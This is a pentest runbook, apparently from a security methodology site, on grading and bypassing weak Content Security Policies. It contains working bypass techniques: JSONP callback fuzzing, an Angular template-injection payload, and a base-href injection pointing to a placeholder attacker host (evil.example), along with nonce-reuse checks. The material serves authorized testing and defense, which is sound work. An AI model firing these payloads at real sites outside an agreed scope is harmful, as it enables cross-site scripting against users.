---
title: "Content Security Policy (CSP) Bypass"
description: "Reading CSP policies and bypassing weak ones via JSONP, trusted CDNs, base-uri, gadget libraries, and strict-dynamic quirks."
phase: Web
order: 21
tags:
  - csp
  - client-side
  - xss
  - bypass
tools:
  - burp suite
  - google csp evaluator
updated: 2026-10-01
---

A CSP bypass runbook for authorized pentests / bug bounty on **in-scope** targets only. Goal: capture the active policy, grade it, and find a route to script execution that the policy fails to stop.

## 1. Capture the active policy

There can be multiple headers with different names; collect them all.

```bash
# Full header set (avoid curl's default header folding)
curl -sI "https://target.com/" | grep -i "content-security-policy"

# Raw response when a WAF mangles formatting
curl -s -D - "https://target.com/" -o /dev/null | grep -i -A1 "content-security-policy"

# Save to a file for grading
curl -sI "https://target.com/" | grep -i "content-security-policy" > csp.txt
```

## 2. Grade the policy

Feed the raw header to the CSP Evaluator to spot missing directives (`base-uri`, `object-src`, `script-src`) and weak sources.

```bash
# Grab just the directive value
grep -i "content-security-policy" csp.txt | sed 's/^[^:]*: *//I'

# Look for dangerous host allowlists and unsafe keywords
grep -iE "unsafe-inline|unsafe-eval|http:|data:|\*" csp.txt
```

Key weaknesses to note in the report: `unsafe-inline`, `unsafe-eval`, wildcard or scheme sources, missing `object-src 'none'`, and missing `base-uri`.

## 3. Hunt for JSONP endpoints on trusted origins

If a trusted `script-src` host exposes a JSONP callback, it can execute attacker-controlled code.

```bash
# Common callback parameter names on an allowlisted CDN/domain
ffuf -u "https://trusted.target.com/api?callback=FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc all -fs 0

# Manual probe — response should reflect the callback name
curl -s "https://trusted.target.com/api?callback=alert"
```

## 4. Angular / gadget library escape

Allowlisted JS frameworks with template expression evaluation can turn a benign script include into execution when the app bootstraps attacker HTML.

```bash
# Confirm the library version served from a trusted origin
curl -s "https://trusted.target.com/vendor/angular.min.js" | head -c 200

# Candidate payloads to test in a reflected sink
# <div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
# <script src="https://trusted.target.com/vendor/angular.min.js"></script>
```

## 5. base-uri and nonce/hash weaknesses

```bash
# If base-uri is missing, a relative script can be hijacked
# Inject: <base href="https://evil.example/">
curl -s "https://target.com/?q=%3Cbase%20href%3D%22https://evil.example/%22%3E"

# Reused nonces across responses defeat the nonce model
for i in 1 2 3; do curl -sI "https://target.com/" | grep -io "nonce-[a-z0-9]*"; done
```

If `strict-dynamic` is set with a whitelist, hash/nonce reuse or an allowlisted script that itself injects is the usual way through.

## 6. Confirm execution

```bash
# Serve a beacon page and watch for the callback
# payload: <script src="https://trusted.target.com/..."></script>
python3 -m http.server 8000
curl -s "https://target.com/?q=<payload>" | grep -i csp
```

## Full pipeline

```bash
# 1. Capture and grade the policy
curl -sI "https://target.com/" | grep -i "content-security-policy" | tee csp.txt
grep -iE "unsafe-inline|unsafe-eval|data:|\*" csp.txt

# 2. Enumerate JSONP on a trusted script host
ffuf -u "https://trusted.target.com/api?callback=FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc all -fs 0

# 3. Manual JSONP and framework probes
curl -s "https://trusted.target.com/api?callback=alert"
curl -s "https://trusted.target.com/vendor/angular.min.js" | head -c 200

# 4. base-uri and nonce checks
curl -s "https://target.com/?q=%3Cbase%20href%3D%22https://evil.example/%22%3E"
for i in 1 2 3; do curl -sI "https://target.com/" | grep -io "nonce-[a-z0-9]*"; done

# 5. Confirm execution with a beacon
python3 -m http.server 8000
```

## Ethics & legality

- Only test CSP behavior on domains within the authorized scope.
- Use alerts or a callback you control as proof — no data theft or persistence.
- Do not degrade availability (no resource-exhaustion payloads).
- Record the exact policy, payload, and response as report evidence.
